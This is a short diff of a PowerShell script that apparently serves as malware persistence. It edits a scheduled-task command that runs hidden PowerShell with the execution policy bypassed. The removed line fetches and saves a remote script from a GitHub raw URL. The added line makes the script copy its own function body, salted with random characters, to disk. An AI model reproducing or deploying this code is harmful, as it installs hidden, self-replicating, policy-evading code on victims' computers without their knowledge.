@@ -28,7 +28,7 @@ function Gen-Info {
     
     # SCHEDULE TASK CREATION
     
-    $cmd = "if (-not (Test-Path '$alfa_path') -and -not (Test-Path '$bravo_path') -and -not (Test-Path '$charlie_path')) { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/alfa.ps1', '$alfa_path') } else { if (Test-Path '$alfa_path') { powershell.exe -nop -ExecutionPolicy Bypass -WindowStyle Hidden $alfa_path } else { if (Test-Path '$bravo_path') { powershell.exe -nop -ExecutionPolicy Bypass -WindowStyle Hidden $bravo_path } else { if (Test-Path '$charlie_path') { & '$charlie_path' } } } }"
+    $cmd = "if (-not (Test-Path '$alfa_path') -and -not (Test-Path '$bravo_path') -and -not (Test-Path '$charlie_path')) { `"function Gen-Info {$funcBody`n}`nGen-Info`n# $random_chars`" | Out-File -FilePath `"$bravo_path`" -Encoding UTF8 } else { if (Test-Path '$alfa_path') { powershell.exe -nop -ExecutionPolicy Bypass -WindowStyle Hidden $alfa_path } else { if (Test-Path '$bravo_path') { powershell.exe -nop -ExecutionPolicy Bypass -WindowStyle Hidden $bravo_path } else { if (Test-Path '$charlie_path') { & '$charlie_path' } } } }"
     
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"$cmd`""
     $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -ExecutionTimeLimit (New-TimeSpan)
